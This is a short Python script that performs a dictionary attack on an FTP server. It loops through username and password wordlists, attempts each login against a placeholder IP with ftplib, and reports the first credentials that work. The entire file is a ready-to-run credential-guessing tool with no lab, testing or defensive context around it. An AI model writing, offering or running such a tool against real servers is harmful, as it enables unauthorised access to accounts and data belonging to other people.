from ftplib import FTP, error_perm


def ftp_bruteforce(ip: str, user_path: str, password_path: str, port: int = 21):
    with open(user_path, encoding='utf-8', errors='ignore') as users:
        for user in users:
            user: str = user.strip()
            with open(password_path, encoding='utf-8', errors='ignore') as passwords:
                for password in passwords:
                    password: str = password.strip()
                    try:
                        ftp = FTP(ip)
                        ftp.connect(ip, port, timeout=3)
                        ftp.login(user, password)
                        print(f'[+] Password found | USER: {user.strip()}, PASSWORD: {password.strip()}')
                        ftp.quit()
                        return True
                    except error_perm:
                        print(f'[-] Incorrect password: USER | {user.strip()}, PASSWORD: {password.strip()}')
                    except Exception as e:
                        print(f'[-] Error: {str(e)}')
    return False

ip : str = 'x.x.x.x'
list_user: str = r'wlist/user.txt'
list_pass: str = r'wlist/password.txt'

ftp_bruteforce(ip, list_user, list_pass)
